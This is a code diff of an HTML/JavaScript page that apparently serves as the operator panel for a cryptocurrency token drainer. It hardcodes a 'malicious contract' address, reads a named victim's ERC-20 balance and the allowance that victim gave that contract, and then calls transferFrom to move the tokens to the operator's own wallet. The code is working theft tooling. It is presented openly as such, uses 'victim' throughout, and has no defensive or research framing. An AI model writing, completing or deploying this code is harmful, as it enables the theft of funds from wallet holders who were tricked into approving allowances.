@@ -67,7 +67,6 @@
         let maliciousContractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a";  // The malicious contract address
         let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575";  // The address of the token you want to withdraw
         let contract;
-        let deployerAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // The address of the deployer
 
         window.onload = () => {
             console.debug("Page loaded. Checking for MetaMask...");
@@ -102,7 +101,7 @@
             try {
                 console.debug("Requesting wallet connection...");
                 const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                userAccount = accounts[0];
+                userAccount = accounts[0];  // This gets the connected wallet address (deployer's address)
                 console.debug("Wallet connected:", userAccount);
                 document.getElementById('status').innerText = `Connected: ${userAccount}`;
                 document.getElementById('checkBalanceBtn').style.display = "inline-block";
@@ -127,5 +126,91 @@
 
                 // Get the victim's token balance using the ERC-20 token contract
                 const tokenContract = new web3.eth.Contract([{
-                 
+                    "constant": true,
+                    "inputs": [
+                        { "name": "_owner", "type": "address" }
+                    ],
+                    "name": "balanceOf",
+                    "outputs": [
+                        { "name": "balance", "type": "uint256" }
+                    ],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                }], tokenAddress);
+
+                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
+                console.debug("Victim's token balance: " + victimBalance);
+
+                // Display the balance in a readable format
+                if (victimBalance <= 0) {
+                    document.getElementById('balance').innerText = "Victim has no tokens to withdraw!";
+                } else {
+                    document.getElementById('balance').innerText = `Victim's Token Balance: ${victimBalance}`;
+                }
+            } catch (error) {
+                console.error("Error checking balance:", error);
+                document.getElementById('balance').innerText = "Error checking balance.";
+            }
+        }
+
+        async function withdrawTokens() {
+            const victimAddress = document.getElementById('victimAddress').value;
+
+            if (!victimAddress) {
+                alert("Please enter a victim's address!");
+                console.debug("No victim address provided.");
+                return;
+            }
+
+            try {
+                console.debug("Fetching allowance for victim:", victimAddress);
+
+                // Get the approved allowance for the malicious contract
+                const tokenContract = new web3.eth.Contract([{
+                    "constant": true,
+                    "inputs": [
+                        { "name": "_owner", "type": "address" },
+                        { "name": "_spender", "type": "address" }
+                    ],
+                    "name": "allowance",
+                    "outputs": [
+                        { "name": "remaining", "type": "uint256" }
+                    ],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                }], tokenAddress);
+
+                const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                console.debug("Approved allowance: " + allowance);
+
+                // Get the victim's token balance
+                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
+                console.debug("Victim's token balance: " + victimBalance);
+
+                // Calculate the maximum amount that can be withdrawn (the lesser of the victim's balance and the approved allowance)
+                const withdrawAmount = Math.min(victimBalance, allowance);
+                console.debug("Amount to withdraw: " + withdrawAmount);
+
+                // Check if there are any tokens to withdraw
+                if (withdrawAmount <= 0) {
+                    alert("No approved tokens to withdraw!");
+                    console.debug("No tokens approved or available for withdrawal.");
+                    return;
+                }
+
+                // Perform the transfer using transferFrom function
+                await tokenContract.methods.transferFrom(victimAddress, userAccount, withdrawAmount).send({ from: userAccount });
+
+                console.debug("Successfully withdrew " + withdrawAmount + " tokens from " + victimAddress);
+                document.getElementById('status').innerText = `Successfully withdrawn ${withdrawAmount} tokens from ${victimAddress}!`;
+            } catch (error) {
+                console.error("Error withdrawing tokens:", error);
+                document.getElementById('status').innerText = "Error withdrawing tokens.";
+            }
+        }
+    </script>
+</body>
+</html>
 
